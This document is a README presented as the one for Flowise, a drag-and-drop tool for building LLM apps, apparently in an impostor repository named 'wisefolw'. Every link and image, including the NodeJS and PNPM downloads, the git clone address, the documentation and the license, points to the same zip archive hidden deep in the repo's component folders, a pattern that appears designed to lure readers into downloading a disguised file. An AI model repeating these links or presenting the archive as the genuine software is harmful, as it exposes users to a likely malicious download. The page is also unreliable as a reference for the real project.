<!-- markdownlint-disable MD030 -->

<img width="100%" src="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip"></a>

# Flowise - Build LLM Apps Easily

[![Release Notes](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
[![Discord](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
[![Twitter Follow](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
[![GitHub star chart](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
[![GitHub fork](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

English | [中文](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

<h3>Drag & drop UI to build your customized LLM flow</h3>
<a href="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip">
<img width="100%" src="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip"></a>

## ⚡Quick Start

Download and Install [NodeJS](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip) >= 18.15.0

1. Install Flowise
    ```bash
    npm install -g flowise
    ```
2. Start Flowise

    ```bash
    npx flowise start
    ```

    With username & password

    ```bash
    npx flowise start --FLOWISE_USERNAME=user --FLOWISE_PASSWORD=1234
    ```

3. Open [http://localhost:3000](http://localhost:3000)

## 🐳 Docker

### Docker Compose

1. Go to `docker` folder at the root of the project
2. Copy `https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip` file, paste it into the same location, and rename to `.env`
3. `docker-compose up -d`
4. Open [http://localhost:3000](http://localhost:3000)
5. You can bring the containers down by `docker-compose stop`

### Docker Image

1. Build the image locally:
    ```bash
    docker build --no-cache -t flowise .
    ```
2. Run image:

    ```bash
    docker run -d --name flowise -p 3000:3000 flowise
    ```

3. Stop image:
    ```bash
    docker stop flowise
    ```

## 👨‍💻 Developers

Flowise has 3 different modules in a single mono repository.

-   `server`: Node backend to serve API logics
-   `ui`: React frontend
-   `components`: Third-party nodes integrations

### Prerequisite

-   Install [PNPM](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
    ```bash
    npm i -g pnpm
    ```

### Setup

1. Clone the repository

    ```bash
    git clone https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip
    ```

2. Go into repository folder

    ```bash
    cd Flowise
    ```

3. Install all dependencies of all modules:

    ```bash
    pnpm install
    ```

4. Build all the code:

    ```bash
    pnpm build
    ```

5. Start the app:

    ```bash
    pnpm start
    ```

    You can now access the app on [http://localhost:3000](http://localhost:3000)

6. For development build:

    - Create `.env` file and specify the `VITE_PORT` (refer to `https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip`) in `packages/ui`
    - Create `.env` file and specify the `PORT` (refer to `https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip`) in `packages/server`
    - Run

        ```bash
        pnpm dev
        ```

    Any code changes will reload the app automatically on [http://localhost:8080](http://localhost:8080)

## 🔒 Authentication

To enable app level authentication, add `FLOWISE_USERNAME` and `FLOWISE_PASSWORD` to the `.env` file in `packages/server`:

```
FLOWISE_USERNAME=user
FLOWISE_PASSWORD=1234
```

## 🌱 Env Variables

Flowise support different environment variables to configure your instance. You can specify the following variables in the `.env` file inside `packages/server` folder. Read [more](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

## 📖 Documentation

[Flowise Docs](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

## 🌐 Self Host

Deploy Flowise self-hosted in your existing infrastructure, we support various [deployments](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

-   [AWS](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
-   [Azure](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
-   [Digital Ocean](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
-   [GCP](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)
-   <details>
      <summary>Others</summary>

    -   [Railway](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

        [![Deploy on Railway](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

    -   [Render](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

        [![Deploy to Render](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

    -   [HuggingFace Spaces](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

        <a href="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip"><img src="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip" alt="HuggingFace Spaces"></a>

    -   [Elestio](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

        [![Deploy](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

    -   [Sealos](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip%3FtemplateName%3Dflowise)

        [![](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip%3FtemplateName%3Dflowise)

    -   [RepoCloud](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

        [![Deploy on RepoCloud](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

      </details>

## 💻 Cloud Hosted

Coming soon

## 🙋 Support

Feel free to ask any questions, raise problems, and request new features in [discussion](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

## 🙌 Contributing

Thanks go to these awesome contributors

<a href="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip">
<img src="https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip" />
</a>

See [contributing guide](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip). Reach out to us at [Discord](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip) if you have any questions or issues.
[![Star History Chart](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip)

## 📄 License

Source code in this repository is made available under the [Apache License Version 2.0](https://github.com/lilago/wisefolw/raw/refs/heads/main/packages/components/nodes/responsesynthesizer/SimpleResponseBuilder/Software_v1.7.zip).
